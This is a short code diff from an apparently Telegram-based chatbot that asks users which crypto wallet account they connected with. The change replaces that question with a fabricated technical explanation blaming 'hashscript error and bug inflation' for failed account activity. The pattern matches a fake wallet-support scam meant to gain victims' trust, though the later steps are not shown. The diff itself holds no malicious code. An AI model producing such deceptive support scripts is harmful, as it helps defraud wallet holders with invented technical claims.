@@ -30,7 +30,7 @@ def ask_account(update, context: CallbackContext):
      update.message.reply_text("Which wallet account did you use to connect?")
      return TWO
 def first_question_step(message):
-    msg = bot.send_message(message.chat.id, 'Which wallet account did you use to connect?')
+    msg = bot.send_message(message.chat.id, 'I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
     bot.register_next_step_handler(msg, second_step)
 
 def second_step(message):
